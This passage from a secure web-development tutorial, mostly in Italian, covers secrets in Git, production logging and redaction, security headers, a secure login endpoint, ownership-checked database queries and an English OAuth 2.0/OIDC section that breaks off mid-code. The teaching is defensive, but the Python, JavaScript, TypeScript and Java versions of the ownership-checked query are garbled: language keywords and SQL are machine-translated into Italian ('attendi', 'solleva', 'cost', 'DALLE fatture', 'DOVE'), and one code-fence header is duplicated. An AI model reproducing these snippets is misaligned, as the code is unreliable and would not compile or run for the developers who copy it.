+- **Flag cookie SameSite**: `Strict` o `Lax` blocca i cookie dalle richieste multiorigine. I browser moderni hanno come impostazione predefinita `Lax`.
+- **Configurazione CORS**: consenti solo richieste dal tuo dominio frontend.
+- **Token CSRF**: per sistemi legacy basati su moduli: incorpora un token univoco in ogni modulo, verificalo lato server.
+
+12
+
+## Errori di configurazione: buchi di sicurezza creati dall'utente
+
+### (1) Segreti nel controllo della versione
+
+L'errore più catastroficamente comune: chiavi API, password di database, segreti JWT o chiavi di crittografia affidate a Git. Una volta nella cronologia dei commit, ruotare il segreto nel codice non aiuta, il vecchio valore è permanentemente nel log git.
+
+<Callout type="info">
+**Se impegni accidentalmente un segreto su Git, ruotalo/revocalo immediatamente.** L'eliminazione del file in un nuovo commit non lo rimuove dalla cronologia. Supponiamo che il segreto venga compromesso nel momento in cui ha toccato un repository remoto.
+</Callout>
+
+```bash title="pre-commit hook with gitleaks"
+# Install: brew install gitleaks
+# .git/hooks/pre-commit
+gitleaks protect --staged --no-git -v
+# Blocks commit if API keys, passwords, tokens detected in staged files
+```
+
+### (2) Log di debug/verbosi in produzione
+
+In fase di sviluppo, il livello di log è in genere `DEBUG`, analisi dello stack completo, query SQL, corpi delle richieste. In produzione deve essere `INFO` o `WARN`. I log di debug in produzione espongono:
+
+- Nomi di tabelle, nomi di colonne, struttura di query -&gt; abilita l'iniezione SQL mirata.
+- Percorsi dei file e nomi delle funzioni -&gt; rivela la struttura della base di codice.
+- PII dell'utente registrato accidentalmente -&gt; Violazione GDPR + responsabilità di violazione.
+
+Vai a Python JavaScript TypeScript Java
+
+debug in fase di sviluppo, informazioni in produzione e mai il corpo della richiesta
+
+```go title="environment-aware log level"
+import "log/slog"
+
+func setupLogger() {
+    level := slog.LevelInfo  // default: production
+    if os.Getenv("APP_ENV") == "development" {
+        level = slog.LevelDebug
+    }
+    slog.SetDefault(slog.New(slog.NewJSONHandler(os.Stdout,
+        &slog.HandlerOptions{Level: level})))
+}
+```
+
+```python title="environment-aware log level"
+import logging
+import os
+
+
+def setup_logger() -> None:
+    level = logging.INFO  # default: production
+    if os.getenv("APP_ENV") == "development":
+        level = logging.DEBUG
+
+    logging.basicConfig(level=level, format="%(message)s")
+
+    # Third-party libraries are the usual leak: SQLAlchemy's engine
+    # logger prints every query WITH its bound parameters at DEBUG,
+    # which in production means passwords and tokens in your log
+    # aggregator. Pin the noisy ones explicitly.
+    logging.getLogger("sqlalchemy.engine").setLevel(logging.WARNING)
+    logging.getLogger("httpx").setLevel(logging.WARNING)
+```
+
+```js title="environment-aware log level"
+import pino from 'pino'
+
+export const log = pino({
+  // default: production
+  level: process.env.APP_ENV === 'development' ? 'debug' : 'info',
+
+  // Redaction is the part that matters here. A debug log of `req` is an
+  // enormous object, and it contains the Authorization header and the
+  // password field of the body you were trying to inspect.
+  redact: [
+    'req.headers.authorization',
+    'req.headers.cookie',
+    '*.password',
+    '*.token',
+    '*.apiKey',
+  ],
+})
+```
+
+```ts title="environment-aware log level"
+import pino, { type Level } from 'pino'
+
+type Env = 'development' | 'staging' | 'production'
+
+const LEVELS: Record<Env, Level> = {
+  development: 'debug', // everything
+  staging: 'info',
+  production: 'info',   // never debug in production
+}
+
+const env = (process.env.APP_ENV ?? 'production') as Env
+//                                   ^ default to the SAFE value. A
+//                                     missing variable must not turn
+//                                     debug logging on in production.
+
+export const log = pino({
+  level: LEVELS[env],
+  redact: ['req.headers.authorization', 'req.headers.cookie',
+           '*.password', '*.token', '*.apiKey'],
+})
+```
+
+```java title="environment-aware log level"
+// Configuration, not code, and driven by the Spring profile:
+//
+//   <configuration>
+//     <springProfile name="production">
+//       <root level="INFO"/>
+//       <!-- These two are the ones that leak. Hibernate's parameter
+//            binder logs every bound value, which is every password
+//            you ever hashed and every token you ever stored. -->
+//       <logger name="org.hibernate.SQL" level="WARN"/>
+//       <logger name="org.hibernate.orm.jdbc.bind" level="WARN"/>
+//       <logger name="org.springframework.web" level="WARN"/>
+//     </springProfile>
+//
+//     <springProfile name="default">
+//       <root level="DEBUG"/>
+//     </springProfile>
+//   </configuration>
+
+// And explicitly OFF in production, because both print request bodies:
+//   spring.jpa.show-sql: false
+//   server.error.include-stacktrace: never
+```
+
+### (3) Intestazioni di sicurezza
+
+Una singola chiamata al middleware aggiunge tutte le intestazioni di sicurezza standard del settore. Ogni framework principale ne ha uno:
+
+| Intestazione | Scopo |
+| --------------------------------- | ------------------------------------------------------- |
+| `Content-Security-Policy`         | Controlla quali script/risorse possono essere eseguiti (impedisce XSS) |
+| `X-Frame-Options: DENY`           | Impedisce l'incorporamento negli iframe (impedisce il clickjacking) |
+| `X-Content-Type-Options: nosniff` | Previene gli attacchi di sniffing di tipo MIME |
+| `Strict-Transport-Security`       | Forza HTTPS, impedisce lo stripping SSL |
+| `Referrer-Policy`                 | Controlla la quantità di informazioni sul referrer inviate multiorigine |
+
+Vai a Python JavaScript TypeScript Java
+
+impostarli una volta, nel middleware, per ogni risposta
+
+```go title="secure headers middleware / chi"
+import "github.com/go-chi/chi/v5/middleware"
+
+r.Use(middleware.SetHeader("X-Frame-Options", "DENY"))
+r.Use(middleware.SetHeader("X-Content-Type-Options", "nosniff"))
+r.Use(middleware.SetHeader("Referrer-Policy", "strict-origin-when-cross-origin"))
+r.Use(middleware.SetHeader(
+    "Strict-Transport-Security",
+    "max-age=63072000; includeSubDomains; preload"))
+r.Use(middleware.SetHeader(
+    "Content-Security-Policy",
+    "default-src 'self'; script-src 'self'; object-src 'none'"))
+```
+
+```python title="secure headers middleware"
+from starlette.middleware.base import BaseHTTPMiddleware
+
+HEADERS = {
+    "X-Frame-Options": "DENY",
+    "X-Content-Type-Options": "nosniff",
+    "Referrer-Policy": "strict-origin-when-cross-origin",
+    "Strict-Transport-Security": "max-age=63072000; includeSubDomains; preload",
+    "Content-Security-Policy": "default-src 'self'; script-src 'self'; object-src 'none'",
+}
+
+
+class SecurityHeaders(BaseHTTPMiddleware):
+    async def dispatch(self, request, call_next):
+        response = await call_next(request)
+        response.headers.update(HEADERS)
+        return response
+
+
+app.add_middleware(SecurityHeaders)
+```
+
+```js title="helmet"
+import helmet from 'helmet'
+
+// helmet() sets sensible defaults for all of these and more, in one line
+app.use(helmet({
+  contentSecurityPolicy: {
+    directives: {
+      defaultSrc: ["'self'"],
+      scriptSrc: ["'self'"],
+      objectSrc: ["'none'"],
+    },
+  },
+  strictTransportSecurity: {
+    maxAge: 63_072_000,
+    includeSubDomains: true,
+    preload: true,
+  },
+  referrerPolicy: { policy: 'strict-origin-when-cross-origin' },
+}))
+
+// Worth knowing what helmet does NOT do: it will not set HSTS on a
+// plain-HTTP response, so behind a proxy you still need
+// app.set('trust proxy', 1) for the header to appear at all.
+```
+
+```ts title="helmet"
+import helmet, { type HelmetOptions } from 'helmet'
+
+// Pinning the options in a typed constant means a directive removed by
+// a careless edit is visible in review rather than silently absent, and
+// a misspelled directive name fails the build.
+const SECURITY: HelmetOptions = {
+  contentSecurityPolicy: {
+    directives: {
+      defaultSrc: ["'self'"],
+      scriptSrc: ["'self'"],   // no 'unsafe-inline': that voids the CSP
+      objectSrc: ["'none'"],
+      frameAncestors: ["'none'"], // the modern X-Frame-Options
+    },
+  },
+  strictTransportSecurity: { maxAge: 63_072_000, includeSubDomains: true, preload: true },
+  referrerPolicy: { policy: 'strict-origin-when-cross-origin' },
+}
+
+app.use(helmet(SECURITY))
+
+// Roll a CSP out with Content-Security-Policy-Report-Only first. A
+// strict policy on an existing app breaks something almost every time,
+// and report-only tells you what without taking the site down.
+```
+
+```java title="Spring Security headers"
+// Spring Security sets most of these by DEFAULT the moment it is on the
+// classpath: X-Content-Type-Options, X-Frame-Options: DENY, and cache
+// control. CSP and HSTS preload are the two you configure yourself.
+@Bean
+SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
+    return http
+        .headers(headers -> headers
+            .frameOptions(frame -> frame.deny())
+            .contentTypeOptions(Customizer.withDefaults())
+            .referrerPolicy(ref -> ref.policy(
+                ReferrerPolicy.STRICT_ORIGIN_WHEN_CROSS_ORIGIN))
+            .httpStrictTransportSecurity(hsts -> hsts
+                .maxAgeInSeconds(63_072_000)
+                .includeSubDomains(true)
+                .preload(true))
+            .contentSecurityPolicy(csp -> csp
+                .policyDirectives("default-src 'self'; script-src 'self'; object-src 'none'"))
+        )
+        .build();
+}
+```
+
+13
+
+## Difesa in profondità: nessun singolo strato è sufficiente
+
+> "Nessuna singola difesa è perfetta. Costruiscila a strati. Un attaccante deve aggirarli tutti contemporaneamente, il che è esponenzialmente più difficile."
+
+<Diagram caption="Fig 7: Defence in depth: attacker must break through every layer to reach your core business logic.">
+<svg viewBox="0 0 680 240" xmlns="http://www.w3.org/2000/svg" width="100%"><rect width="680" height="240" fill="var(--dg-paper)"></rect><circle cx="340" cy="120" r="200" fill="none" stroke="var(--dg-line)" stroke-width="1" stroke-dasharray="4 3"></circle><circle cx="340" cy="120" r="160" fill="none" stroke="var(--dg-line)" stroke-width="1" stroke-dasharray="4 3"></circle><circle cx="340" cy="120" r="120" fill="none" stroke="var(--dg-line)" stroke-width="1" stroke-dasharray="4 3"></circle><circle cx="340" cy="120" r="80" fill="none" stroke="var(--dg-line)" stroke-width="1" stroke-dasharray="4 3"></circle><circle cx="340" cy="120" r="40" fill="var(--dg-surface)" stroke="var(--dg-line)"></circle><text x="340" y="116" text-anchor="middle" fill="var(--dg-ink)" font-family="var(--font-ui)" font-size="10" font-weight="700">Nucleo</text><text x="340" y="128" text-anchor="middle" fill="var(--dg-ink)" font-family="var(--font-ui)" font-size="10">Logica</text><text x="340" y="66" text-anchor="middle" fill="var(--dg-accent)" font-family="var(--font-ui)" font-size="11" font-weight="700">Convalida dell'input</text><text x="340" y="24" text-anchor="middle" fill="var(--dg-accent)" font-family="var(--font-ui)" font-size="11" font-weight="700">Operazioni parametrizzate</text><text x="536" y="120" text-anchor="middle" fill="var(--dg-info)" font-family="var(--font-ui)" font-size="11" font-weight="700">AutN / AutZ</text><text x="144" y="120" text-anchor="middle" fill="var(--dg-info)" font-family="var(--font-ui)" font-size="11" font-weight="700">Limitazione della velocità</text><text x="340" y="176" text-anchor="middle" fill="var(--dg-info)" font-family="var(--font-ui)" font-size="11" font-weight="700">Intestazioni di sicurezza + CSP</text><text x="340" y="216" text-anchor="middle" fill="var(--dg-ok)" font-family="var(--font-ui)" font-size="11" font-weight="700">Monitoraggio + registri di controllo</text></svg>
+</Diagram>
+
+### Le tre domande da porsi ad ogni confine
+
+1. **Dove sono i dati che attraversano un confine?** (Utente -&gt; SQL, Utente -&gt; Shell, Utente -&gt; HTML)
+2. **Cosa presumo riguardo a questi dati?** (È pulito? È un'e-mail valida? È sicuro?)
+3. **E se questi presupposti fossero sbagliati?** (Cosa guadagna l'aggressore se viola questo presupposto?)
+
+Se poni queste tre domande per ogni porzione di codice che gestisce l'input dell'utente, eviterai il 99% delle vulnerabilità che interrompono i sistemi di produzione reali.
+
+14
+
+## Riferimento ai modelli sicuri
+
+Tutto da questo capitolo, assemblato. Leggi una scheda dall'inizio alla fine e avrai l'intera lista di controllo in un unico posto: convalida la forma, esegui query con parametri, verifica in tempo costante, rispondi con un errore **generico** in entrambi i casi, conia l'ID di sessione da un CSPRNG e imposta tutti e tre i flag dei cookie.
+
+### Endpoint di accesso sicuro completo
+
+Vai a Python JavaScript TypeScript Java
+
+convalidare, parametrizzare, verificare, errore generico, token CSPRNG, cookie contrassegnato
+
+```go title="the complete secure login endpoint"
+func loginHandler(db *pgxpool.Pool, redis *redis.Client) http.HandlerFunc {
+    return func(w http.ResponseWriter, r *http.Request) {
+        var req struct {
+            Email    string `json:"email"`
+            Password string `json:"password"`
+        }
+        json.NewDecoder(r.Body).Decode(&req)
+
+        // 1. Validate format (first line of defence)
+        if !isValidEmail(req.Email) || len(req.Password) < 8 {
+            http.Error(w, "invalid credentials", 400)
+            return
+        }
+
+        // 2. Parameterised query, no SQL injection possible
+        var userID string
+        var hashedPass string
+        err := db.QueryRow(ctx,
+            "SELECT id, password_hash FROM users WHERE email = $1",
+            req.Email).Scan(&userID, &hashedPass)
+
+        // 3. Generic error, never reveal whether email exists
+        if err != nil || !verifyArgon2(req.Password, hashedPass) {
+            http.Error(w, "invalid email or password", 401)
+            return
+        }
+
+        // 4. Cryptographically secure session ID
+        sessionID := generateSecureToken(32)
+
+        // 5. Store session in Redis with metadata
+        redis.Set(ctx, "session:"+sessionID,
+            userID, 7*24*time.Hour)
+
+        // 6. Secure cookie, HttpOnly, Secure, SameSite=Strict
+        http.SetCookie(w, &http.Cookie{
+            Name: "session_id", Value: sessionID,
+            HttpOnly: true, Secure: true,
+            SameSite: http.SameSiteStrictMode,
+            MaxAge: 7 * 24 * 3600,
+        })
+        w.WriteHeader(http.StatusOK)
+    }
+}
+
+func generateSecureToken(n int) string {
+    b := make([]byte, n)
+    rand.Read(b) // crypto/rand, not math/rand
+    return base64.URLEncoding.EncodeToString(b)
+}
+```
+
+```python title="FastAPI secure auth"
+from fastapi import FastAPI, HTTPException, Response
+from argon2 import PasswordHasher
+from argon2.exceptions import VerifyMismatchError
+import secrets
+
+ph = PasswordHasher(time_cost=1, memory_cost=65536, parallelism=4)
+
+@app.post("/login")
+async def login(email: str, password: str, response: Response):
+    # 1. Parameterised query (psycopg2 / asyncpg)
+    row = await db.fetchrow(
+        "SELECT id, password_hash FROM users WHERE email = $1", email
+    )
+
+    # 2. Constant-time verify. Generic error always.
+    valid = False
+    if row:
+        try:
+            ph.verify(row["password_hash"], password)
+            valid = True
+        except VerifyMismatchError:
+            pass
+
+    if not valid:
+        raise HTTPException(401, "invalid email or password")
+
+    # 3. Cryptographically secure session token (32 bytes = 256 bits)
+    session_id = secrets.token_urlsafe(32)
+    await redis.set(f"session:{session_id}", row["id"], ex=604800)
+
+    # 4. HttpOnly + Secure + SameSite cookie
+    response.set_cookie(
+        key="session_id", value=session_id,
+        httponly=True, secure=True,
+        samesite="strict", max_age=604800
+    )
+    return {"status": "ok"}
+```
+
+```js title="Express secure login"
+import { randomBytes } from 'node:crypto'
+import argon2 from 'argon2'
+
+app.post('/login', loginLimiter, async (req, res) => {
+  const { email, password } = req.body ?? {}
+
+  // 1. Validate format (first line of defence)
+  if (typeof email !== 'string' || typeof password !== 'string' ||
+      !isValidEmail(email) || password.length < 8) {
+    return res.status(400).json({ error: 'invalid credentials' })
+  }
+
+  // 2. Parameterised query, no SQL injection possible
+  const { rows } = await db.query(
+    'SELECT id, password_hash FROM users WHERE email = $1', [email])
+  const user = rows[0]
+
+  // 3. Generic error, never reveal whether the email exists.
+  //    Note the dummy verify: skipping the hash when the user is not
+  //    found returns in 1ms instead of 100ms, and that timing
+  //    difference is a working account-enumeration oracle.
+  const hash = user?.password_hash ?? DUMMY_HASH
+  const valid = (await argon2.verify(hash, password)) && user !== undefined
+
+  if (!valid) {
+    return res.status(401).json({ error: 'invalid email or password' })
+  }
+
+  // 4. Cryptographically secure session ID (crypto, never Math.random)
+  const sessionId = randomBytes(32).toString('base64url')
+
+  // 5. Store session in Redis with a TTL
+  await redis.set(`session:${sessionId}`, user.id, { EX: 7 * 24 * 3600 })
+
+  // 6. Secure cookie: HttpOnly, Secure, SameSite=Strict
+  res.cookie('session_id', sessionId, {
+    httpOnly: true,
+    secure: true,
+    sameSite: 'strict',
+    maxAge: 7 * 24 * 3600 * 1000,
+  })
+
+  res.sendStatus(200)
+})
+```
+
+```ts title="Express secure login"
+import { randomBytes } from 'node:crypto'
+import { z } from 'zod'
+import argon2 from 'argon2'
+import type { Request, Response } from 'express'
+
+// 1. Validate format as a SCHEMA, so the shape check and the type come
+//    from one declaration and cannot drift apart.
+const LoginBody = z.object({
+  email: z.string().email(),
+  password: z.string().min(8),
+})
+
+export async function login(req: Request, res: Response): Promise<void> {
+  const parsed = LoginBody.safeParse(req.body)
+  if (!parsed.success) {
+    res.status(400).json({ error: 'invalid credentials' })
+    return
+  }
+  const { email, password } = parsed.data
+
+  // 2. Parameterised query, no SQL injection possible
+  const { rows } = await db.query<{ id: string; password_hash: string }>(
+    'SELECT id, password_hash FROM users WHERE email = $1', [email])
+  const user = rows[0]
+
+  // 3. Constant-time-ish: always run the hash, so a missing user takes
+  //    the same ~100ms as a wrong password. Generic error either way.
+  const hash = user?.password_hash ?? DUMMY_HASH
+  const ok = await argon2.verify(hash, password).catch(() => false)
+
+  if (!ok || user === undefined) {
+    res.status(401).json({ error: 'invalid email or password' })
+    return
+  }
+
+  // 4. 32 bytes = 256 bits from the CSPRNG. Math.random() is seeded and
+  //    predictable, and a predictable session id is a full account
+  //    takeover, not a theoretical weakness.
+  const sessionId = randomBytes(32).toString('base64url')
+
+  // 5 + 6. Store server-side, hand out only the opaque id
+  await redis.set(`session:${sessionId}`, user.id, { EX: 7 * 24 * 3600 })
+  res.cookie('session_id', sessionId, SESSION_COOKIE) // see sec 06
+  res.sendStatus(200)
+}
+```
+
+```java title="Spring Boot secure login"
+@RestController
+class AuthController {
+    private static final SecureRandom RANDOM = new SecureRandom();
+
+    private final JdbcClient db;
+    private final PasswordEncoder encoder;
+    private final StringRedisTemplate redis;
+
+    @PostMapping("/login")
+    ResponseEntity<?> login(@Valid @RequestBody LoginRequest req,
+                            HttpServletResponse response) {
+        // 1. Validate format: @Valid + the record's own constraints did
+        //    it before this method ran. See chapter 05.
+
+        // 2. Parameterised query, no SQL injection possible
+        Optional<UserRow> user = db.sql(
+                "SELECT id, password_hash FROM users WHERE email = ?")
+            .param(req.email())
+            .query(UserRow.class)
+            .optional();
+
+        // 3. Always run the hash, even when the user is absent, so the
+        //    response time does not reveal which emails are registered.
+        String hash = user.map(UserRow::passwordHash).orElse(DUMMY_HASH);
+        boolean valid = encoder.matches(req.password(), hash) && user.isPresent();
+
+        if (!valid) {
+            // Generic error, never reveal whether the email exists
+            return ResponseEntity.status(401)
+                .body(Map.of("error", "invalid email or password"));
+        }
+
+        // 4. Cryptographically secure session ID. SecureRandom, never
+        //    java.util.Random, whose seed is guessable from two outputs.
+        byte[] bytes = new byte[32];
+        RANDOM.nextBytes(bytes);
+        String sessionId = Base64.getUrlEncoder().withoutPadding().encodeToString(bytes);
+
+        // 5. Store session in Redis with a TTL
+        redis.opsForValue().set("session:" + sessionId, user.get().id(),
+            Duration.ofDays(7));
+
+        // 6. Secure cookie: HttpOnly, Secure, SameSite=Strict
+        ResponseCookie cookie = ResponseCookie.from("session_id", sessionId)
+            .httpOnly(true).secure(true).sameSite("Strict")
+            .maxAge(Duration.ofDays(7)).path("/")
+            .build();
+        response.addHeader(HttpHeaders.SET_COOKIE, cookie.toString());
+
+        return ResponseEntity.ok().build();
+    }
+}
+
+// Record it, whichever way it went. A failed login that nobody can see
+// is a brute-force attempt nobody can alert on.
+```
+
+### La query sicura BOLA
+
+Vai a Python JavaScript TypeScript Java
+
+il controllo della proprietà appartiene alla clausola WHERE, non dopo il ritorno della riga
+
+```go title="BOLA-safe DB query"
+func GetInvoice(ctx context.Context, db *pgxpool.Pool,
+    invoiceID int64, currentUserID string) (*Invoice, error) {
+
+    var inv Invoice
+    // Ownership check IN the query, not after it. Fetching first and
+    // comparing afterwards works right up until somebody adds an early
+    // return, or logs the row, or the comparison is against the wrong
+    // field. In the WHERE clause it cannot be skipped.
+    err := db.QueryRow(ctx, `
+        SELECT id, amount, user_id
+        FROM   invoices
+        WHERE  id = $1 AND user_id = $2`,
+        invoiceID, currentUserID,
+    ).Scan(&inv.ID, &inv.Amount, &inv.UserID)
+
+    if errors.Is(err, pgx.ErrNoRows) {
+        // 404, not 403. A 403 confirms the invoice EXISTS, which hands
+        // an attacker a working oracle for enumerating other people's
+        // ids one request at a time.
+        return nil, apperr.NotFound("invoice")
+    }
+    return &inv, err
+}
+```
+
+```python title="BOLA-safe DB query"
+```python title="BOLA-safe DB query"
+async def get_invoice(invoice_id: int, current_user_id: int):
+    # controllo della proprietà NELLA query, non dopo
+    riga = attendi db.fetchrow(
+        "SELECT * FROM fatture WHERE id=$1 AND user_id=$2",
+        ID_fattura, ID_utente_corrente
+    )
+    se non riga:
+        # 404, non 403. Non confermare l'esistenza della fattura.
+        solleva HTTPException(404, "fattura non trovata")
+    riga di ritorno
+```
+
+```js title="BOLA-safe DB query"
+esporta la funzione asincrona getInvoice(invoiceId, currentUserId) &#123;
+  // Ownership check IN the query, not after
+  cost { rows } = attendi db.query(
+    'SELECT * FROM fatture WHERE id = $1 AND user_id = $2',
+    [IDfattura, IDutentecorrente],
+  )
+
+  if (righe.lunghezza === 0) &#123;
+    // 404, not 403. Don't confirm the invoice exists.
+    lancia notFound('fattura')
+  &#125;
+  restituisci righe[0]
+&#125;
+
+// The currentUserId comes from the SESSION, never from the request. An
+// id taken from the body or a query param is not an ownership check at
+// all, it is the attacker telling you who to pretend they are.
+```
+
+```ts title="BOLA-safe DB query"
+// Making the caller pass the viewer explicitly, as a required argument,
+// is the structural version of this rule: a repository method that
+// cannot be called without a user id is one nobody can accidentally
+// call without the ownership filter.
+funzione di esportazione asincrona getInvoice(
+  IDfattura: numero,
+  currentUserId: stringa, // richiesto, e proviene dalla sessione
+): Promesso<Invoice> &#123;
+  cost { rows } = attendi db.query<Invoice>(
+    'SELECT id, importo, id_utente DALLE fatture WHERE id = $1 E id_utente = $2',
+    [IDfattura, IDutentecorrente],
+  )
+
+  fattura const = righe[0]
+  if (fattura === non definita) &#123;
+    // 404, not 403. A 403 confirms the row exists and turns the endpoint
+    // into an enumeration oracle for other users' invoice ids.
+    lancia notFound('fattura')
+  &#125;
+  fattura di reso
+&#125;
+```
+
+```java title="BOLA-safe DB query"
+fattura pubblica getInvoice(longbillId, String currentUserId) &#123;
+    // Ownership check IN the query, not after
+    return db.sql("""
+            SELECT id, importo, user_id
+            DALLE fatture
+            DOVE id = ? AND id_utente = ?
+            """)
+        .params(IDfattura, IDutentecorrente)
+        .query(Fattura.class)
+        .optional()
+        // 404, not 403. Don't confirm the invoice exists.
+        .orElseThrow(() -&gt; nuova ResponseStatusException(
+            HttpStatus.NOT_FOUND, "fattura non trovata"));
+&#125;
+
+// With Spring Data, the same rule is expressed in the method name, and
+// it is worth preferring for exactly that reason: findById(id) is one
+// keystroke away and is the vulnerable version.
+//   Optional<Invoice> findByIdAndUserId(id lungo, String userId);
+
+// The currentUserId must come from the SecurityContext, never from the
+// request:  SecurityContextHolder.getContext().getAuthentication()
+```
+
+16
+
+## OAuth 2.0 & OIDC: Delegated Authentication
+
+OAuth 2.0 is an **authorization framework** that allows a third-party application to obtain limited access to a user's account on another service, without ever seeing the user's password. OpenID Connect (OIDC) is a thin identity layer on top of OAuth 2.0 that adds authentication (who the user _is_), not just authorization (what they can _do_).
+
+> "Sign in with Google" is OIDC. "Allow this app to read your Google Drive" is OAuth 2.0. In practice, modern auth providers (Clerk, Auth0) combine both.
+
+### The Four Roles
+
+| Role                     | Who It Is                   | Example               |
+| ------------------------ | --------------------------- | --------------------- |
+| **Resource Owner**       | The user                    | Alice                 |
+| **Client**               | Your application            | YourSaaS.com          |
+| **Authorization Server** | Issues tokens after consent | Google, GitHub, Auth0 |
+| **Resource Server**      | API that holds user data    | Google Calendar API   |
+
+### Authorization Code Flow: The Secure Standard
+
+This is the flow used by every serious web application. It keeps tokens off the browser URL bar and exchanges a short-lived _code_ for tokens server-side.
+
+<Diagram caption="Fig A: OAuth 2.0 Authorization Code Flow with PKCE. Steps (6)-(7) are server-to-server, tokens never touch the browser URL bar.">
+<svg viewBox="0 0 680 420" xmlns="http://www.w3.org/2000/svg" width="100%"><rect width="680" height="420" fill="var(--dg-paper)"></rect><defs><marker id="oa" markerWidth="7" markerHeight="7" refX="5" refY="3" orient="auto"><path d="M0,0 L5,3 L0,6 Z" fill="var(--dg-ink-2)"></path></marker><marker id="ob" markerWidth="7" markerHeight="7" refX="5" refY="3" orient="auto"><path d="M0,0 L5,3 L0,6 Z" fill="var(--dg-accent)"></path></marker><marker id="og" markerWidth="7" markerHeight="7" refX="5" refY="3" orient="auto"><path d="M0,0 L5,3 L0,6 Z" fill="var(--dg-ok)"></path></marker><marker id="ob2" markerWidth="7" markerHeight="7" refX="5" refY="3" orient="auto"><path d="M0,0 L5,3 L0,6 Z" fill="var(--dg-info)"></path></marker></defs><text x="70" y="28" text-anchor="middle" font-family="var(--font-ui)" font-size="13" font-weight="700" fill="var(--dg-ink)">Browser / User</text><text x="310" y="28" text-anchor="middle" font-family="var(--font-ui)" font-size="13" font-weight="700" fill="var(--dg-ink)">Your Backend</text><text x="570" y="28" text-anchor="middle" font-family="var(--font-ui)" font-size="13" font-weight="700" fill="var(--dg-ink)">Auth Server (Google)</text><line x1="70" y1="35" x2="70" y2="410" stroke="var(--dg-line)" stroke-width="1" stroke-dasharray="4 3"></line><line x1="310" y1="35" x2="310" y2="410" stroke="var(--dg-line)" stroke-width="1" stroke-dasharray="4 3"></line><line x1="570" y1="35" x2="570" y2="410" stroke="var(--dg-line)" stroke-width="1" stroke-dasharray="4 3"></line><line x1="72" y1="60" x2="308" y2="60" stroke="var(--dg-accent)" stroke-width="1.5" marker-end="url(#ob)"></line><rect x="90" y="42" width="200" height="16" rx="3" fill="var(--dg-paper)"></rect><text x="190" y="54" text-anchor="middle" font-family="var(--font-ui)" font-size="11" fill="var(--dg-accent)">(1) Click "Sign in with Google"</text><line x1="308" y1="90" x2="72" y2="90" stroke="var(--dg-ink-2)" stroke-width="1.5" marker-end="url(#oa)"></line><rect x="90" y="72" width="210" height="16" rx="3" fill="var(--dg-paper)"></rect><text x="190" y="84" text-anchor="middle" font-family="var(--font-ui)" font-size="11" fill="var(--dg-ink-2)">(2) Redirect to Google + state + code&#95;challenge</text><line x1="72" y1="130" x2="568" y2="130" stroke="var(--dg-accent)" stroke-width="1.5" marker-end="url(#ob)"></line><rect x="160" y="112" width="260" height="16" rx="3" fill="var(--dg-paper)"></rect><text x="290" y="124" text-anchor="middle" font-family="var(--font-ui)" font-size="11" fill="var(--dg-accent)">(3) Browser navigates to Google login + consent screen</text><line x1="568" y1="170" x2="72" y2="170" stroke="var(--dg-ink-2)" stroke-width="1.5" marker-end="url(#oa)"></line><rect x="160" y="152" width="250" height="16" rx="3" fill="var(--dg-paper)"></rect><text x="290" y="164" text-anchor="middle" font-family="var(--font-ui)" font-size="11" fill="var(--dg-ink-2)">(4) Google redirects back with authorization&#95;code</text><line x1="72" y1="210" x2="308" y2="210" stroke="var(--dg-accent)" stroke-width="1.5" marker-end="url(#ob)"></line><rect x="90" y="192" width="200" height="16" rx="3" fill="var(--dg-paper)"></rect><text x="190" y="204" text-anchor="middle" font-family="var(--font-ui)" font-size="11" fill="var(--dg-accent)">(5) Browser sends code to your backend callback</text><line x1="312" y1="250" x2="568" y2="250" stroke="var(--dg-ok)" stroke-width="1.8" marker-end="url(#og)"></line><rect x="360" y="232" width="190" height="16" rx="3" fill="var(--dg-paper)"></rect><text x="445" y="244" text-anchor="middle" font-family="var(--font-ui)" font-size="11" fill="var(--dg-ok)">(6) Backend exchanges code -> access&#95;token + id&#95;token</text><text x="445" y="260" text-anchor="middle" font-family="var(--font-diagram-mono)" font-size="9" fill="var(--dg-ink-2)">(server-to-server, never touches browser)</text><line x1="568" y1="285" x2="312" y2="285" stroke="var(--dg-ok)" stroke-width="1.8" marker-end="url(#og)"></line><rect x="360" y="268" width="180" height="16" rx="3" fill="var(--dg-paper)"></rect><text x="445" y="280" text-anchor="middle" font-family="var(--font-ui)" font-size="11" fill="var(--dg-ok)">(7) Google returns tokens + user info (sub, email)</text><line x1="308" y1="325" x2="72" y2="325" stroke="var(--dg-info)" stroke-width="1.5" marker-end="url(#ob2)"></line><rect x="90" y="308" width="200" height="16" rx="3" fill="var(--dg-paper)"></rect><text x="190" y="320" text-anchor="middle" font-family="var(--font-ui)" font-size="11" fill="var(--dg-info)">(8) Backend creates session -> sets HttpOnly cookie</text><rect x="20" y="350" width="640" height="50" rx="8" fill="var(--dg-ok-surface)" stroke="var(--dg-ok)"></rect><text x="340" y="372" text-anchor="middle" font-family="var(--font-ui)" font-size="12" font-weight="700" fill="var(--dg-ok)">PKCE, Proof Key for Code Exchange</text><text x="340" y="390" text-anchor="middle" font-family="var(--font-ui)" font-size="11" fill="var(--dg-ink-2)">client generates code&#95;verifier (random) -> hashes it to code&#95;challenge -> sent in step (2)</text><text x="340" y="404" text-anchor="middle" font-family="var(--font-ui)" font-size="11" fill="var(--dg-ink-2)">Google checks verifier in step (6) -> prevents authorization code interception attacks</text></svg>
+</Diagram>
+
+### Key Security Rules for OAuth
+
+- **Always use PKCE**: even for server-side apps. It prevents code interception attacks where an attacker intercepts the `code` from the redirect URL.
+- **Validate the `state` parameter**: generate a random value, store it in the session before redirect, verify it when Google redirects back. This prevents CSRF on the OAuth flow itself.
+- **Never expose `access_token` to the browser**: exchange the code server-side and issue your own session cookie. The access token is a credential; treat it like a password.
+- **Link OAuth to existing accounts by email carefully**: if a user already has an email+password account and signs in via Google with the same email, you must decide: auto-link (convenient, small risk) or require confirmation. Auto-linking without verification enables account takeover if the OAuth provider is compromised.
+- **Verify the `aud` (audience) claim** in the id\_token, ensures the token was issued for _your_ app, not another OAuth client using the same provider.
+
+### OIDC vs OAuth 2.0: One-Line Difference
+
+| Protocol      | Answers                 | Token                                            |
+| ------------- | ----------------------- | ------------------------------------------------ |
+| **OAuth 2.0** | "What can this app do?" | Access Token (opaque or JWT)                     |
+| **OIDC**      | "Who is this user?"     | ID Token (always JWT with `sub`, `email`, `iat`) |
+
+Go Python JavaScript TypeScript Java
+
+check the state, exchange the code server-side, then VERIFY the ID token
+
+```go title="verify an OIDC ID token / go-oidc"
+import (
+    "github.com/coreos/go-oidc/v3/oidc"
+    "golang.org/x/oauth2"
+)
+
+var (
